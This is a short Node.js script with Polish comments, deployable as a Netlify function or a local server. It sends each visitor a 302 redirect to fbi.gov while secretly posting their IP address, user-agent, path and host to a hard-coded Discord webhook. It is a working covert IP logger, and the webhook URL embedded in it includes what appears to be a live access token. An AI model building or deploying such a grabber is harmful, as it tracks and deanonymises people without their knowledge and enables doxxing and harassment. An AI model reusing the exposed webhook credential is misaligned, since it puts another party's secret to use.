const https = require('https');
const http = require('http');

// ===== KONFIGURACJA =====
const REDIRECT_URL = 'https://www.fbi.gov/';
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
const PORT = process.env.PORT || 80;
// ========================

// ─── Webhook ──────────────────────────────────────────────────────────────────
function sendWebhook(embed) {
    return new Promise((resolve) => {
        const body = JSON.stringify({ embeds: [embed] });
        const url = new URL(WEBHOOK_URL);

        const req = https.request({
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body),
            },
        }, resolve);

        req.on('error', () => resolve());
        req.write(body);
        req.end();
    });
}

function buildEmbed({ ip, method, path, userAgent, host }) {
    return {
        title: '🌐 Nowe wejście',
        color: 0x57F287,
        fields: [
            { name: '🖥️ IP', value: `\`${ip || 'brak'}\``, inline: true },
            { name: '📄 Ścieżka', value: `\`${path || '/'}\``, inline: true },
            { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
            { name: '📬 Metoda', value: `\`${method}\``, inline: true },
            { name: '⚡ Akcja', value: `Redirect → ${REDIRECT_URL}`, inline: false },
            { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 200)}\``, inline: false },
        ],
        footer: { text: 'Redirect Logger' },
        timestamp: new Date().toISOString(),
    };
}

// ─── Logika redirectu (wspólna) ───────────────────────────────────────────────
async function handleRequest({ ip, method, path, userAgent, host }) {
    await Promise.race([
        sendWebhook(buildEmbed({ ip, method, path, userAgent, host })),
        new Promise(r => setTimeout(r, 1500)),
    ]);
}

// ─── NETLIFY FUNCTION (eksport dla Netlify) ───────────────────────────────────
exports.handler = async (event) => {
    const ip = event.headers['x-forwarded-for']?.split(',')[0].trim()
        || event.headers['x-nf-client-connection-ip']
        || 'brak';
    const method = event.httpMethod;
    const path = event.path;
    const userAgent = event.headers['user-agent'];
    const host = event.headers['host'];

    await handleRequest({ ip, method, path, userAgent, host });

    return {
        statusCode: 302,
        headers: {
            'Location': REDIRECT_URL,
            'Cache-Control': 'no-store, no-cache',
        },
        body: '',
    };
};

// ─── LOKALNY SERWER (tylko gdy uruchomiony przez `node server.js`) ────────────
if (require.main === module) {
    const server = http.createServer((req, res) => {
        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
        const method = req.method;
        const path = req.url;
        const userAgent = req.headers['user-agent'];
        const host = req.headers['host'] || '';

        // ⚡ Redirect natychmiast
        res.writeHead(302, {
            'Location': REDIRECT_URL,
            'Cache-Control': 'no-store, no-cache',
        });
        res.end();

        setImmediate(() => {
            console.log(`[HTTP] ${new Date().toISOString()} | IP: ${ip} | ${method} ${path}`);
            handleRequest({ ip, method, path, userAgent, host });
        });
    });

    server.listen(PORT, '0.0.0.0', () => {
        console.log(`✅ Serwer nasłuchuje na 0.0.0.0:${PORT}`);
        console.log(`   Redirect: / → ${REDIRECT_URL}`);
    });
}
